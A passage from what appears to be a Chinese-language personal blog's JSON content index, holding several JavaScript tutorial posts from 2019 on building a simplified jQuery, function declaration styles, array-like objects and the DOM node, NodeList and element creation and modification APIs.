nodes[i] = temp[i] } nodes.length = temp.length } else if (nodeOrSelector instanceof Node) { nodes = { 0: nodeOrSelector, length: 1 } } nodes.addClass = function(classes) { for (let i = 0; i \u0026lt; nodes.length;i++) { nodes[i].classList.add(classes) } } nodes.setText = function(text) { for (let i = 0; i \u0026lt; nodes.length; i++) { nodes[i].textContent = text } } return nodes } window.$ = jQuery var $div = $('div') $div.addClass('red') // 可将所有 div 的 class 添加一个 red $div.setText('hi') // 可将所有 div 的 textContent 变为 hi 参考资料：阮一峰-如何做到jQuery\n","date":"2019-04-24T18:49:36+08:00","permalink":"http://808Mak1r.github.io/p/%E8%87%AA%E5%B7%B1%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E7%89%88jquery/","title":"自己写一个简版jQuery"},{"content":"具名函数 function f(x,y){return x +y } 关键字+函数名+参数+{} function 和var意思差不多，表示声明一个特殊的变量（对象）\n匿名函数 f = function(x,y){return x +y } 给变量赋值一个具名函数 f = function n(x,y){return x +y } 函数n的作用域只限函数内，和具名函数不同，体现了JS的不一致性，不建议使用。\n函数对象 window.Fuction函数对象 new Fuction ('x','y','return x + y ') var n = 1 new Fuction ('x','y','return x' +n+ 'return y ') f(1,2) //4 //等同于 //new Fuction ('x','y','return x+n+ y') 箭头函数 箭头函数都是匿名函数\nf=(x,y) =\u0026gt; { return x + y} sum = (x,y) =\u0026gt; {return x + y} sum(1,2) //3 sum(2,4) //6 简化 return和{}必须同时省略\nsum = (x,y) =\u0026gt; x + y sum(1,2) //3 sum(2,4) //6 如果只有一个参数的情况下可以这样写\nx = n =\u0026gt; n*n n(2) //4 n(3) //9 ","date":"2019-04-17T17:58:27+08:00","permalink":"http://808Mak1r.github.io/p/js%E5%87%BD%E6%95%B0%E7%9A%84%E4%BA%94%E7%A7%8D%E5%A3%B0%E6%98%8E%E6%96%B9%E5%BC%8F/","title":"JS函数的五种声明方式"},{"content":"在JavaScript中，除了6种原始数据类型之外，其他所有的都是对象，包括函数（Function）。\n基本数据类型：String,boolean,Number,Undefined, Null,Symbol\n引用数据类型：Object(Array,Date,RegExp,Function)\n在这个前提下，咱们再来讨论JavaScript的对象。\n创建对象 var obj = {}; //种方式创建对象，被称之为对象直接量（Object Literal） var obj = new Object(); // 创建一个空对象，和{}一样 创建数组 var arr = [];//这是使用数组直接量（Array Literal）创建数组 var arr = new Array();//构造函数Array() 创建数组对象 对象与数组的关系 在说区别之前，需要先提到另外一个知识，就是JavaScript的原型继承。所有JavaScript的内置构造函数都是继承自 Object.prototype。在这个前提下，可以理解为使用 new Array() 或 [] 创建出来的数组对象，都会拥有 Object.prototype 的属性值。\nvar obj = {};// 拥有Object.prototype的属性值 var arr = []; //使用数组直接量创建的数组，由于Array.prototype的属性继承自 Object.prototype， //那么，它将同时拥有Array.prototype和Object.prototype的属性值 可以得到对象和数组的第一个区别：对象没有数组Array.prototype的属性值\n什么是数组 数组具有一个最基本特征：索引，这是对象所没有的，下面来看一段代码：\nvar obj = {}; var arr = []; obj[2] = 'a'; arr[2] = 'a'; console.log(obj[2]); // 输出 a console.log(arr[2]); // 输出 a console.log(obj.length); // 输出 undefined console.log(arr.length); // 输出 3 通过上面这个测试，可以看到，虽然 obj[2]与arr[2] 都输出\u0026rsquo;a'，但是，在输出length上有明显的差异，这是为什么呢？\nobj[2]与arr[2]的区别  obj[2]输出\u0026rsquo;a'，是因为对象就是普通的键值对存取数据 而arr[2]输出\u0026rsquo;a\u0026rsquo;则不同，数组是通过索引来存取数据，arr[2]之所以输出\u0026rsquo;a'，是因为数组arr索引2的位置已经存储了数据  obj.length与arr.length的区别  obj.length并不具有数组的特性，并且obj没有保存属性length，那么自然就会输出undefined 而对于数组来说，length是数组的一个内置属性，数组会根据索引长度来更改length的值。  为什么arr.length输出3，而不是1呢？ 这是由于数组的特殊实现机制，对于普通的数组，如果它的索引是从0开始连续的，那么length的值就会等于数组中元素个数\n而对于上面例子中arr，在给数组添加元素时，并没有按照连续的索引添加，所以导致数组的索引不连续，那么就导致索引长度大于元素个数，那么我们称之为稀疏数组。\n伪数组 定义：\n 拥有length属性，其它属性（索引）为非负整数(对象中的索引会被当做字符串来处理，这里你可以当做是个非负整数串来理解) 不具有数组所具有的方法  伪数组，就是像数组一样有 length 属性，也有 0、1、2、3 等属性的对象，看起来就像数组一样，但不是数组，比如\nvar fakeArray = { length: 3, \u0026quot;0\u0026quot;: \u0026quot;first\u0026quot;, \u0026quot;1\u0026quot;: \u0026quot;second\u0026quot;, \u0026quot;2\u0026quot;: \u0026quot;third\u0026quot; }; for (var i = 0; i \u0026lt; fakeArray.length; i++) { console.log(fakeArray[i]); } Array.prototype.join.call(fakeArray,'+'); 常见的参数的参数 arguments，DOM 对象列表（比如通过 document.getElementsByTags 得到的列表），jQuery 对象（比如 $(\u0026ldquo;div\u0026rdquo;)）。\n伪数组是一个 Object，而真实的数组是一个 Array\nfakeArray instanceof Array === false; Object.prototype.toString.call(fakeArray) === \u0026quot;[object Object]\u0026quot;; var arr = [1,2,3,4,6]; arr instanceof Array === true; Object.prototype.toString.call(arr) === \u0026quot;[object Array]\u0026quot; 代码用来判断一个对象是否属于“类数组”。如下：\n// Determine if o is an array-like object. // Strings and functions have numeric length properties, but are // excluded by the typeof test. In client-side JavaScript, DOM text // nodes have a numeric length property, and may need to be excluded // with an additional o.nodeType != 3 test. function isArrayLike(o) { if (o \u0026amp;\u0026amp; // o is not null, undefined, etc. typeof o === 'object' \u0026amp;\u0026amp; // o is an object isFinite(o.length) \u0026amp;\u0026amp; // o.length is a finite number o.length \u0026gt;= 0 \u0026amp;\u0026amp; // o.length is non-negative o.length===Math.floor(o.length) \u0026amp;\u0026amp; // o.length is an integer o.length \u0026lt; 4294967296) // o.length \u0026lt; 2^32 return true; // Then o is array-like else return false; // Otherwise it is not } 不过有个更简单的办法来判断，用 Array.isArray\nArray.isArray(fakeArray) === false; Array.isArray(arr) === true; 从外观上看伪数组，看不出来它与数组的区别，在JavaScript内置对象中常见的伪数组就是大名鼎鼎的auguments：\n(function() { console.log(typeof arguments); // 输出 object，它并不是一个数组 }()); 另外在DOM对象中，childNodes也是伪数组\nconsole.log(typeof document.body.childNodes); // 输出 object 除此之外，还有很多常用的伪数组，就不一一列举。\n伪数组存在的意义，是可以让普通的对象也能正常使用数组的很多算法，比如：\nvar arr = Array.prototype.slice.call(arguments) 或者 var arr = Array.prototype.slice.call(arguments, 0); // 将arguments对象转换成一个真正的数组 Array.prototype.forEach.call(arguments, function(v) { // 循环arguments对象 }); 除了使用 Array.prototype.slice.call(arguments)，你也可以简单的使用[].slice.call(arguments) 来代替。另外，你可以使用 bind 来简化该过程。\nvar unboundSlice = Array.prototype.slice; var slice = Function.prototype.call.bind(unboundSlice); function list() { return slice(arguments); } var list1 = list(1, 2, 3); // [1, 2, 3] 将具有length属性的对象转换成数组对象，arguments是每个函数在运行的时候自动获得的一个近似数组的对象（传入函数的参数从0开始按数字排列，而且有length）。\n比如当你 func(\u0026lsquo;a\u0026rsquo;, \u0026lsquo;b\u0026rsquo;, \u0026lsquo;c\u0026rsquo;) 的时候，func里面获得的arguments[0] 是 \u0026lsquo;a\u0026rsquo;，arguments[1] 是 \u0026lsquo;b\u0026rsquo;，依次类推。但问题在于这个arguments对象其实并不是Array，所以没有slice方法。Array.prototype.slice.call( )可以间接对其实现slice的效果，而且返回的结果是真正的Array。\n对于IE9以前的版本(DOM实现基于COM)，我们可以使用makeArray来实现。\n// 伪数组转化成数组 var makeArray = function(obj) { if (!obj || obj.length === 0) { return []; } // 非伪类对象，直接返回最好 if (!obj.length) { return obj; } // 针对IE8以前 DOM的COM实现 try { return [].slice.call(obj); } catch (e) { var i = 0, j = obj.length, res = []; for (; i \u0026lt; j; i++) { res.push(obj[i]); } return res; } }; 总结 对象没有数组Array.prototype的属性值，类型是Object，而数组类型是Array；\n数组是基于索引的实现，length会自动更新，而对象是键值对；\n使用对象可以创建伪数组，伪数组可以正常使用数组的大部分方法；\n","date":"2019-04-13T17:28:10+08:00","permalink":"http://808Mak1r.github.io/p/js%E7%9A%84%E6%95%B0%E7%BB%84%E4%B8%8E%E4%BC%AA%E6%95%B0%E7%BB%84%E7%9A%84%E5%8C%BA%E5%88%AB/","title":"JS的数组与伪数组的区别"},{"content":"DOM DOM 是 JavaScript 操作网页的接口，全称为“文档对象模型”（Document Object Model）。它的作用是将网页转为一个 JavaScript 对象，从而可以用脚本进行各种操作（比如增删内容）。\n浏览器会根据 DOM 模型，将结构化文档（比如 HTML 和 XML）解析成一系列的节点，再由这些节点组成一个树状结构（DOM Tree）。所有的节点和最终的树状结构，都有规范的对外接口。\nDOM 只是一个接口规范，可以用各种语言实现。所以严格地说，DOM 不是 JavaScript 语法的一部分，但是 DOM 操作是 JavaScript 最常见的任务，离开了 DOM，JavaScript 就无法控制网页。另一方面，JavaScript 也是最常用于 DOM 操作的语言。后面介绍的就是 JavaScript 对 DOM 标准的实现和用法。\nNode 接口 Node.prototype.nodeType nodeType属性返回一个整数值，表示节点的类型。\ndocument.nodeType // 9 上面代码中，文档节点的类型值为9。\nNode 对象定义了几个常量，对应这些类型值。\ndocument.nodeType === Node.DOCUMENT_NODE // true 上面代码中，文档节点的nodeType属性等于常量Node.DOCUMENT_NODE。\n不同节点的nodeType属性值和对应的常量如下。\n 文档节点（document）：9，对应常量Node.DOCUMENT_NODE 元素节点（element）：1，对应常量Node.ELEMENT_NODE 属性节点（attr）：2，对应常量Node.ATTRIBUTE_NODE 文本节点（text）：3，对应常量Node.TEXT_NODE 文档片断节点（DocumentFragment）：11，对应常量Node.DOCUMENT_FRAGMENT_NODE 文档类型节点（DocumentType）：10，对应常量Node.DOCUMENT_TYPE_NODE 注释节点（Comment）：8，对应常量Node.COMMENT_NODE 确定节点类型时，使用nodeType属性是常用方法。  var node = document.documentElement.firstChild; if (node.nodeType === Node.ELEMENT_NODE) { console.log('该节点是元素节点'); } Node.prototype.nodeName nodeName属性返回节点的名称。\n// HTML 代码如下 // \u0026lt;div id=\u0026quot;d1\u0026quot;\u0026gt;hello world\u0026lt;/div\u0026gt; var div = document.getElementById('d1'); div.nodeName // \u0026quot;DIV\u0026quot; 上面代码中，元素节点的nodeName属性就是大写的标签名DIV。\n不同节点的nodeName属性值如下。\n 文档节点（document）：#document 元素节点（element）：大写的标签名 属性节点（attr）：属性的名称 文本节点（text）：#text 文档片断节点（DocumentFragment）：#document-fragment 文档类型节点（DocumentType）：文档的类型 注释节点（Comment）：#comment  Node.prototype.nodeValue nodeValue属性返回一个字符串，表示当前节点本身的文本值，该属性可读写。\n只有文本节点（text）、注释节点（comment）和属性节点（attr）有文本值，因此这三类节点的nodeValue可以返回结果，其他类型的节点一律返回null。同样的，也只有这三类节点可以设置nodeValue属性的值，其他类型的节点设置无效。\n// HTML 代码如下 // \u0026lt;div id=\u0026quot;d1\u0026quot;\u0026gt;hello world\u0026lt;/div\u0026gt; var div = document.getElementById('d1'); div.nodeValue // null div.firstChild.nodeValue // \u0026quot;hello world\u0026quot; 上面代码中，div是元素节点，nodeValue属性返回null。div.firstChild是文本节点，所以可以返回文本值。\nNode.prototype.textContent textContent属性返回当前节点和它的所有后代节点的文本内容。\n// HTML 代码为 // \u0026lt;div id=\u0026quot;divA\u0026quot;\u0026gt;This is \u0026lt;span\u0026gt;some\u0026lt;/span\u0026gt; text\u0026lt;/div\u0026gt; document.getElementById('divA').textContent // This is some text textContent属性自动忽略当前节点内部的 HTML 标签，返回所有文本内容。\n该属性是可读写的，设置该属性的值，会用一个新的文本节点，替换所有原来的子节点。它还有一个好处，就是自动对 HTML 标签转义。这很适合用于用户提供的内容。\ndocument.getElementById('foo').textContent = '\u0026lt;p\u0026gt;GoodBye!\u0026lt;/p\u0026gt;'; 上面代码在插入文本时，会将标签解释为文本，而不会当作标签处理。\n对于文本节点（text）、注释节点（comment）和属性节点（attr），textContent属性的值与nodeValue属性相同。对于其他类型的节点，该属性会将每个子节点（不包括注释节点）的内容连接在一起返回。如果一个节点没有子节点，则返回空字符串。\n文档节点（document）和文档类型节点（doctype）的textContent属性为null。如果要读取整个文档的内容，可以使用document.documentElement.textContent。\nNode.prototype.baseURI baseURI属性返回一个字符串，表示当前网页的绝对路径。浏览器根据这个属性，计算网页上的相对路径的 URL。该属性为只读。\n// 当前网页的网址为 // http://www.example.com/index.html document.baseURI // \u0026quot;http://www.example.com/index.html\u0026quot; 如果无法读到网页的 URL，baseURI属性返回null。\n该属性的值一般由当前网址的 URL（即window.location属性）决定，但是可以使用 HTML 的标签，改变该属性的值。\n\u0026lt;base href=\u0026quot;http://www.example.com/page.html\u0026quot;\u0026gt; 设置了以后，baseURI属性就返回标签设置的值。\nNode.prototype.ownerDocument Node.ownerDocument属性返回当前节点所在的顶层文档对象，即document对象。\nvar d = p.ownerDocument; d === document // true document对象本身的ownerDocument属性，返回null。\nNode.prototype.nextSibling Node.nextSibling属性返回紧跟在当前节点后面的第一个同级节点。如果当前节点后面没有同级节点，则返回null。\n// HTML 代码如下 // \u0026lt;div id=\u0026quot;d1\u0026quot;\u0026gt;hello\u0026lt;/div\u0026gt;\u0026lt;div id=\u0026quot;d2\u0026quot;\u0026gt;world\u0026lt;/div\u0026gt; var d1 = document.getElementById('d1'); var d2 = document.getElementById('d2'); d1.nextSibling === d2 // true 上面代码中，d1.nextSibling就是紧跟在d1后面的同级节点d2。\n注意，该属性还包括文本节点和注释节点（）。因此如果当前节点后面有空格，该属性会返回一个文本节点，内容为空格。\nnextSibling属性可以用来遍历所有子节点。\nvar el = document.getElementById('div1').firstChild; while (el !== null) { console.log(el.nodeName); el = el.nextSibling; } 上面代码遍历div1节点的所有子节点。\nNodeList 接口 NodeList实例是一个类似数组的对象，它的成员是节点对象。通过以下方法可以得到NodeList实例。\n Node.childNodes document.querySelectorAll()等节点搜索方法  document.body.childNodes instanceof NodeList // true NodeList实例很像数组，可以使用length属性和forEach方法。但是，它不是数组，不能使用pop或push之类数组特有的方法。\nvar children = document.body.childNodes; Array.isArray(children) // false children.length // 34 children.forEach(console.log) 上面代码中，NodeList 实例children不是数组，但是具有length属性和forEach方法。\n如果NodeList实例要使用数组方法，可以将其转为真正的数组。\nvar children = document.body.childNodes; var nodeArr = Array.prototype.slice.call(children); 除了使用forEach方法遍历 NodeList 实例，还可以使用for循环。\nvar children = document.body.childNodes; for (var i = 0; i \u0026lt; children.length; i++) { var item = children[i]; } 注意，NodeList 实例可能是动态集合，也可能是静态集合。所谓动态集合就是一个活的集合，DOM 删除或新增一个相关节点，都会立刻反映在 NodeList 实例。目前，只有Node.childNodes返回的是一个动态集合，其他的 NodeList 都是静态集合。\nvar children = document.body.childNodes; children.length // 18 document.body.appendChild(document.createElement('p')); children.length // 19 上面代码中，文档增加一个子节点，NodeList 实例children的length属性就增加了1。\nNodeList.prototype.length length属性返回 NodeList 实例包含的节点数量。\ndocument.querySelectorAll('xxx').length // 0 上面代码中，document.querySelectorAll返回一个 NodeList 集合。对于那些不存在的 HTML 标签，length属性返回0。\nNodeList.prototype.forEach() forEach方法用于遍历 NodeList 的所有成员。它接受一个回调函数作为参数，每一轮遍历就执行一次这个回调函数，用法与数组实例的forEach方法完全一致。\nvar children = document.body.childNodes; children.forEach(function f(item, i, list) { // ... }, this); 上面代码中，回调函数f的三个参数依次是当前成员、位置和当前 NodeList 实例。forEach方法的第二个参数，用于绑定回调函数内部的this，该参数可省略。\nNodeList.prototype.item() item方法接受一个整数值作为参数，表示成员的位置，返回该位置上的成员。\ndocument.body.childNodes.item(0) 上面代码中，item(0)返回第一个成员。\n如果参数值大于实际长度，或者索引不合法（比如负数），item方法返回null。如果省略参数，item方法会报错。\n所有类似数组的对象，都可以使用方括号运算符取出成员。一般情况下，都是使用方括号运算符，而不使用item方法。\ndocument.body.childNodes[0] NodeList.prototype.keys()，NodeList.prototype.values()，NodeList.prototype.entries() 这三个方法都返回一个 ES6 的遍历器对象，可以通过for\u0026hellip;of循环遍历获取每一个成员的信息。区别在于，keys()返回键名的遍历器，values()返回键值的遍历器，entries()返回的遍历器同时包含键名和键值的信息。\nvar children = document.body.childNodes; for (var key of children.keys()) { console.log(key); } // 0 // 1 // 2 // ... for (var value of children.values()) { console.log(value); } // #text // \u0026lt;script\u0026gt; // ... for (var entry of children.entries()) { console.log(entry); } // Array [ 0, #text ] // Array [ 1, \u0026lt;script\u0026gt; ] // ... ParentNode 接口 如果当前节点是父节点，就会继承ParentNode接口。由于只有元素节点（element）、文档节点（document）和文档片段节点（documentFragment）拥有子节点，因此只有这三类节点会继承ParentNode接口。\nParentNode.children children属性返回一个HTMLCollection实例，成员是当前节点的所有元素子节点。该属性只读。\n下面是遍历某个节点的所有元素子节点的示例。\nfor (var i = 0; i \u0026lt; el.children.length; i++) { // ... } 注意，children属性只包括元素子节点，不包括其他类型的子节点（比如文本子节点）。如果没有元素类型的子节点，返回值HTMLCollection实例的length属性为0。\n另外，HTMLCollection是动态集合，会实时反映 DOM 的任何变化。\nParentNode.firstElementChild firstElementChild属性返回当前节点的第一个元素子节点。如果没有任何元素子节点，则返回null。\ndocument.firstElementChild.nodeName // \u0026quot;HTML\u0026quot; 上面代码中，document节点的第一个元素子节点是。\nParentNode.lastElementChild lastElementChild属性返回当前节点的最后一个元素子节点，如果不存在任何元素子节点，则返回null。\ndocument.lastElementChild.nodeName // \u0026quot;HTML\u0026quot; 上面代码中，document节点的最后一个元素子节点是（因为document只包含这一个元素子节点）。\nParentNode.childElementCount childElementCount属性返回一个整数，表示当前节点的所有元素子节点的数目。如果不包含任何元素子节点，则返回0。\ndocument.body.childElementCount // 13 ParentNode.append()，ParentNode.prepend() append方法为当前节点追加一个或多个子节点，位置是最后一个元素子节点的后面。\n该方法不仅可以添加元素子节点，还可以添加文本子节点。\nvar parent = document.body; // 添加元素子节点 var p = document.createElement('p'); parent.append(p); // 添加文本子节点 parent.append('Hello'); // 添加多个元素子节点 var p1 = document.createElement('p'); var p2 = document.createElement('p'); parent.append(p1, p2); // 添加元素子节点和文本子节点 var p = document.createElement('p'); parent.append('Hello', p); 注意，该方法没有返回值。\nprepend方法为当前节点追加一个或多个子节点，位置是第一个元素子节点的前面。它的用法与append方法完全一致，也是没有返回值。\nChildNode 接口 remove方法用于从父节点移除当前节点。\nel.remove() 上面代码在 DOM 里面移除了el节点。\nChildNode.before()，ChildNode.after() before方法用于在当前节点的前面，插入一个或多个同级节点。两者拥有相同的父节点。\n注意，该方法不仅可以插入元素节点，还可以插入文本节点。\nvar p = document.createElement('p'); var p1 = document.createElement('p'); // 插入元素节点 el.before(p); // 插入文本节点 el.before('Hello'); // 插入多个元素节点 el.before(p, p1); // 插入元素节点和文本节点 el.before(p, 'Hello'); after方法用于在当前节点的后面，插入一个或多个同级节点，两者拥有相同的父节点。用法与before方法完全相同。\nChildNode.replaceWith() replaceWith方法使用参数节点，替换当前节点。参数可以是元素节点，也可以是文本节点。\nvar span = document.createElement('span'); el.replaceWith(span); 上面代码中，el节点将被span节点替换。\n节点创建型api 在这里，我将常用的DOM操作api进行分类，首先要介绍的是创建型的api。这一类型的api，简而言之就是用来创建节点的。\ncreateElement createElement通过传入指定的一个标签名来创建一个元素，如果传入的标签名是一个未知的，则会创建一个自定义的标签，注意：IE8以下浏览器不支持自定义标签。 使用如下：\nvar div = document.createElement(\u0026quot;div\u0026quot;); 使用createElement要注意：通过createElement创建的元素并不属于html文档，它只是创建出来，并未添加到html文档中，要调用appendChild或insertBefore等方法将其添加到HTML文档树中。\ncreateTextNode createTextNode用来创建一个文本节点，用法如下：\nvar textNode = document.createTextNode(\u0026quot;一个TextNode\u0026quot;); createTextNode接收一个参数，这个参数就是文本节点中的文本，和createElement一样，创建后的文本节点也只是独立的一个节点，同样需要appendChild将其添加到HTML文档树中\ncloneNode cloneNode是用来返回调用方法的节点的一个副本，它接收一个bool参数，用来表示是否复制子元素，使用如下：\nvar parent = document.getElementById(\u0026quot;parentElement\u0026quot;); var parent2 = parent.cloneNode(true);// 传入true parent2.id = \u0026quot;parent2\u0026quot;; 这段代码通过cloneNode复制了一份parent元素，其中cloneNode的参数为true，表示parent的子节点也被复制，如果传入false，则表示只复制了parent节点。 我们看看这个例子\n\u0026lt;div id=\u0026quot;parent\u0026quot;\u0026gt; 我是父元素的文本 \u0026lt;br/\u0026gt; \u0026lt;span\u0026gt; 我是子元素 \u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button id=\u0026quot;btnCopy\u0026quot;\u0026gt;复制\u0026lt;/button\u0026gt; var parent = document.getElementById(\u0026quot;parent\u0026quot;); document.getElementById(\u0026quot;btnCopy\u0026quot;).onclick = function(){ var parent2 = parent.cloneNode(true); parent2.id = \u0026quot;parent2\u0026quot;; document.body.appendChild(parent2); } 这段代码很简单，主要是绑定button事件，事件内容是复制了一个parent，修改其id，然后添加到文档中。 这里有几点要注意： （1）和createElement一样，cloneNode创建的节点只是游离有html文档外的节点，要调用appendChild方法才能添加到文档树中 （2）如果复制的元素有id，则其副本同样会包含该id，由于id具有唯一性，所以在复制节点后必须要修改其id （3）调用接收的bool参数最好传入，如果不传入该参数，不同浏览器对其默认值的处理可能不同\n除此之外，我们还有一个需要注意的点： 如果被复制的节点绑定了事件，则副本也会跟着绑定该事件吗？这里要分情况讨论： （1）如果是通过addEventListener或者比如onclick进行绑定事件，则副本节点不会绑定该事件 （2）如果是内联方式绑定比如\n\u0026lt;div onclick=\u0026quot;showParent()\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; 这样的话，副本节点同样会触发事件。\ncreateDocumentFragment createDocumentFragment方法用来创建一个DocumentFragment。在前面我们说到DocumentFragment表示一种轻量级的文档，它的作用主要是存储临时的节点用来准备添加到文档中。 createDocumentFragment方法主要是用于添加大量节点到文档中时会使用到。假设要循环一组数据，然后创建多个节点添加到文档中，比如示例\n\u0026lt;ul id=\u0026quot;list\u0026quot;\u0026gt;\u0026lt;/ul\u0026gt; \u0026lt;input type=\u0026quot;button\u0026quot; value=\u0026quot;添加多项\u0026quot; id=\u0026quot;btnAdd\u0026quot; /\u0026gt; document.getElementById(\u0026quot;btnAdd\u0026quot;).onclick = function(){ var list = document.getElementById(\u0026quot;list\u0026quot;); for(var i = 0;i \u0026lt; 100; i++){ var li = document.createElement(\u0026quot;li\u0026quot;); li.textContent = i; list.appendChild(li); } } 这段代码将按钮绑定了一个事件，这个事件创建了100个li节点，然后依次将其添加HTML文档中。这样做有一个缺点：每次一创建一个新的元素，然后添加到文档树中，这个过程会造成浏览器的回流。所谓回流简单说就是指元素大小和位置会被重新计算，如果添加的元素太多，会造成性能问题。这个时候，就是使用createDocumentFragment了。 DocumentFragment不是文档树的一部分，它是保存在内存中的，所以不会造成回流问题。我们修改上面的代码如下：\ndocument.getElementById(\u0026quot;btnAdd\u0026quot;).onclick = function(){ var list = document.getElementById(\u0026quot;list\u0026quot;);\tvar fragment = document.createDocumentFragment(); for(var i = 0;i \u0026lt; 100; i++){ var li = document.createElement(\u0026quot;li\u0026quot;); li.textContent = i; fragment.appendChild(li); } list.appendChild(fragment); } 优化后的代码主要是创建了一个fragment，每次生成的li节点先添加到fragment，最后一次性添加到list，大家可以看示例\n创建型API总结 创建型api主要包括createElement，createTextNode，cloneNode和createDocumentFragment四个方法，需要注意下面几点：\n 它们创建的节点只是一个孤立的节点，要通过appendChild添加到文档中 cloneNode要注意如果被复制的节点是否包含子节点以及事件绑定等问题 使用createDocumentFragment来解决添加大量节点时的性能问题  页面修改型API 前面我们提到创建型api，它们只是创建节点，并没有真正修改到页面内容，而是要调用appendChild来将其添加到文档树中。我在这里将这类会修改到页面内容归为一类。 修改页面内容的api主要包括：appendChild，insertBefore，removeChild，replaceChild。\nappendChild appendChild我们在前面已经用到多次，就是将指定的节点添加到调用该方法的节点的子元素的末尾。调用方法如下：\nparent.appendChild(child); child节点将会作为parent节点的最后一个子节点。 appendChild这个方法很简单，但是还有有一点需要注意：如果被添加的节点是一个页面中存在的节点，则执行后这个节点将会添加到指定位置，其原本所在的位置将移除该节点，也就是说不会同时存在两个该节点在页面上，相当于把这个节点移动到另一个地方。我们来看例子\n\u0026lt;div id=\u0026quot;child\u0026quot;\u0026gt; 要被添加的节点 \u0026lt;/div\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;div id=\u0026quot;parent\u0026quot;\u0026gt; 要移动的位置 \u0026lt;/div\u0026gt;\t\u0026lt;input id=\u0026quot;btnMove\u0026quot; type=\u0026quot;button\u0026quot; value=\u0026quot;移动节点\u0026quot; /\u0026gt; document.getElementById(\u0026quot;btnMove\u0026quot;).onclick = function(){ var child = document.getElementById(\u0026quot;child\u0026quot;); document.getElementById(\u0026quot;parent\u0026quot;).appendChild(child); } 这段代码主要是获取页面上的child节点，然后添加到指定位置，可以看到原本的child节点被移动到parent中了。 这里还有一个要注意的点：如果child绑定了事件，被移动时，它依然绑定着该事件。\ninsertBefore insertBefore用来添加一个节点到一个参照节点之前，用法如下：\nparentNode.insertBefore(newNode,refNode); parentNode表示新节点被添加后的父节点 newNode表示要添加的节点 refNode表示参照节点，新节点会添加到这个节点之前 我们来看这个例子\n\u0026lt;div id=\u0026quot;parent\u0026quot;\u0026gt; 父节点 \u0026lt;div id=\u0026quot;child\u0026quot;\u0026gt;\t子元素 \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;input type=\u0026quot;button\u0026quot; id=\u0026quot;insertNode\u0026quot; value=\u0026quot;插入节点\u0026quot; /\u0026gt; var parent = document.getElementById(\u0026quot;parent\u0026quot;); var child = document.getElementById(\u0026quot;child\u0026quot;); document.getElementById(\u0026quot;insertNode\u0026quot;).onclick = function(){ var newNode = document.createElement(\u0026quot;div\u0026quot;); newNode.textContent = \u0026quot;新节点\u0026quot; parent.insertBefore(newNode,child); } 这段代码创建了一个新节点，然后添加到child节点之前。 和appendChild一样，如果插入的节点是页面上的节点，则会移动该节点到指定位置，并且保留其绑定的事件。\n关于第二个参数参照节点还有几个注意的地方：\n refNode是必传的，如果不传该参数会报错 如果refNode是undefined或null，则insertBefore会将节点添加到子元素的末尾  removeChild removeChild顾名思义，就是删除指定的子节点并返回，用法如下：\nvar deletedChild = parent.removeChild(node); deletedChild指向被删除节点的引用，它等于node，被删除的节点仍然存在于内存中，可以对其进行下一步操作。 注意：如果被删除的节点不是其子节点，则程序将会报错。我们可以通过下面的方式来确保可以删除：\nif(node.parentNode){ node.parentNode.removeChild(node); } 通过节点自己获取节点的父节点，然后将自身删除。\nreplaceChild replaceChild用于使用一个节点替换另一个节点，用法如下\nparent.replaceChild(newChild,oldChild); newChild是替换的节点，可以是新的节点，也可以是页面上的节点，如果是页面上的节点，则其将被转移到新的位置 oldChild是被替换的节点\n页面修改型API总结 页面修改型api主要是这四个接口，要注意几个特点：\n 不管是新增还是替换节点，如果新增或替换的节点是原本存在页面上的，则其原来位置的节点将被移除，也就是说同一个节点不能存在于页面的多个位置 节点本身绑定的事件会不会消失，会一直保留着。  节点查询型API 节点查询型API也是非常常用的api，下面我们分别说明一下每一个api的使用。\ndocument.getElementById 这个接口很简单，根据元素id返回元素，返回值是Element类型，如果不存在该元素，则返回null。 使用这个接口有几点要注意：\n 元素的Id是大小写敏感的，一定要写对元素的id HTML文档中可能存在多个id相同的元素，则返回第一个元素 只从文档中进行搜索元素，如果创建了一个元素并指定id，但并没有添加到文档中，则这个元素是不会被查找到的  document.getElementsByTagName 这个接口根据元素标签名获取元素，返回一个即时的HTMLCollection类型，什么是即时的HTMLCollection类型呢？我们来看看这个示例\n\u0026lt;div\u0026gt;div1\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;div2\u0026lt;/div\u0026gt; \u0026lt;input type=\u0026quot;button\u0026quot; value=\u0026quot;显示数量\u0026quot; id=\u0026quot;btnShowCount\u0026quot;/\u0026gt; \u0026lt;input type=\u0026quot;button\u0026quot; value=\u0026quot;新增div\u0026quot; id=\u0026quot;btnAddDiv\u0026quot;/\u0026gt;\tvar divList = document.getElementsByTagName(\u0026quot;div\u0026quot;); document.getElementById(\u0026quot;btnAddDiv\u0026quot;).onclick = function(){ var div = document.createElement(\u0026quot;div\u0026quot;); div.textContent =\u0026quot;div\u0026quot; + (divList.length+1); document.body.appendChild(div); } document.getElementById(\u0026quot;btnShowCount\u0026quot;).onclick = function(){ alert(divList.length); } 这段代码中有两个按钮，一个按钮是显示HTMLCollection元素的个数，另一个按钮可以新增一个div标签到文档中。前面提到HTMLCollcetion元素是即时的表示该集合是随时变化的，也就是是文档中有几个div，它会随时进行变化，当我们新增一个div后，再访问HTMLCollection时，就会包含这个新增的div。 使用document.getElementsByTagName这个方法有几点要注意：\n 如果要对HTMLCollection集合进行循环操作，最好将其长度缓存起来，因为每次循环都会去计算长度，暂时缓存起来可以提高效率 如果没有存在指定的标签，该接口返回的不是null，而是一个空的HTMLCollection “*”表示所有标签  document.getElementsByName getElementsByName主要是通过指定的name属性来获取元素，它返回一个即时的NodeList对象。 使用这个接口主要要注意几点：\n 返回对象是一个即时的NodeList，它是随时变化的 在HTML元素中，并不是所有元素都有name属性，比如div是没有name属性的，但是如果强制设置div的name属性，它也是可以被查找到的 在IE中，如果id设置成某个值，然后传入getElementsByName的参数值和id值一样，则这个元素是会被找到的，所以最好不好设置同样的值给id和name  document.getElementsByClassName 这个API是根据元素的class返回一个即时的HTMLCollection，用法如下\nvar elements = document.getElementsByClassName(names); 这个接口有下面几点要注意：\n 返回结果是一个即时的HTMLCollection，会随时根据文档结构变化 IE9以下浏览器不支持 如果要获取2个以上classname，可传入多个classname，每个用空格相隔，例如  var elements = document.getElementsByClassName(\u0026quot;test1 test2\u0026quot;); 